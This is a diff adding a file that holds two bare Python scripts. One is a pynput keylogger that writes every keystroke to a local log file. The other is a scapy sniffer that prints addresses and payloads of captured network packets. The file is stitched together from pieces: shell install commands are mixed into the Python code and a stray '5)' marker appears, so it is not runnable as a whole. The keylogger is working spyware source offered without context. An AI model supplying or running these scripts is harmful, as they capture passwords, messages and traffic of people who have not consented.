@@ -1,0 +1,64 @@
+pip install pynput
+
+from pynput import keyboard
+
+# File where the logs will be saved
+log_file = "keylog.txt"
+
+def on_press(key):
+    try:
+        # Try to get the character
+        current_key = key.char
+    except AttributeError:
+        # If the character is not a printable character, get the name of the key
+        current_key = str(key)
+
+    # Save the keystroke to the log file
+    with open(log_file, "a") as f:
+        f.write(current_key + "\n")
+
+def on_release(key):
+    # Stop listener when escape key is pressed
+    if key == keyboard.Key.esc:
+        return False
+
+# Set up the listener
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+5)
+
+pip install scapy
+
+
+from scapy.all import sniff, IP, TCP, UDP
+
+def packet_callback(packet):
+    # Check if the packet has an IP layer
+    if IP in packet:
+        ip_src = packet[IP].src
+        ip_dst = packet[IP].dst
+        protocol = packet[IP].proto
+        
+        print(f"\nPacket captured:")
+        print(f"Source IP: {ip_src}")
+        print(f"Destination IP: {ip_dst}")
+        
+        # Check for TCP protocol
+        if protocol == 6:
+            print("Protocol: TCP")
+            if TCP in packet:
+                payload = packet[TCP].payload
+                print(f"Payload: {payload}")
+                
+        # Check for UDP protocol
+        elif protocol == 17:
+            print("Protocol: UDP")
+            if UDP in packet:
+                payload = packet[UDP].payload
+                print(f"Payload: {payload}")
+        
+# Start sniffing
+print("Starting packet sniffer...")
+sniff(prn=packet_callback, store=0)
+
